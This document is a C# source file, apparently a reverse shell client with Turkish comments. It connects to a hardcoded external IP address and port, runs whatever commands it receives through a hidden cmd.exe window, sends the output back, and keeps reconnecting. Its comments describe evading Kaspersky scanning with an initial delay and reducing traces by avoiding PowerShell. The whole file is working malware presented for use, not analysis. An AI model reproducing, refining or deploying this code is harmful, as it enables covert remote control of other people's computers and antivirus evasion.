using System;
using System.Net.Sockets;
using System.IO;
using System.Diagnostics;
using System.Text;
using System.Threading;

public class LabClient {
    public static void Main() {
        // Kaspersky'nin 'ilk saniye' taramasını atlatmak için 5 saniye bekle
        Thread.Sleep(5000); 
        
        string targetIP = "185.194.175.132";
        int targetPort = 7000;

        while (true) { // Bağlantı koparsa otomatik yeniden bağlanmayı dener
            try {
                using (TcpClient client = new TcpClient(targetIP, targetPort))
                using (Stream stream = client.GetStream())
                using (StreamReader reader = new StreamReader(stream))
                using (StreamWriter writer = new StreamWriter(stream) { AutoFlush = true }) {
                    
                    writer.WriteLine("--- Sistem Aktif: " + Environment.MachineName + " ---");

                    while (client.Connected) {
                        string cmd = reader.ReadLine();
                        if (string.IsNullOrEmpty(cmd) || cmd == "exit") break;

                        // Komut çalıştırma mantığı
                        try {
                            ProcessStartInfo psi = new ProcessStartInfo();
                            psi.FileName = "cmd.exe"; // PowerShell yerine CMD üzerinden çağırarak izi azalt
                            psi.Arguments = "/c " + cmd;
                            psi.RedirectStandardOutput = true;
                            psi.RedirectStandardError = true;
                            psi.UseShellExecute = false;
                            psi.CreateNoWindow = true;
                            psi.WindowStyle = ProcessWindowStyle.Hidden;

                            using (Process p = Process.Start(psi)) {
                                string output = p.StandardOutput.ReadToEnd();
                                string error = p.StandardError.ReadToEnd();
                                writer.WriteLine(output + error + "\nSHELL> ");
                            }
                        }
                        catch (Exception ex) {
                            writer.WriteLine("Hata: " + ex.Message);
                        }
                    }
                }
            }
            catch {
                // Bağlantı kurulamazsa 10 saniye bekle ve tekrar dene
                Thread.Sleep(10000);
            }
        }
    }
}
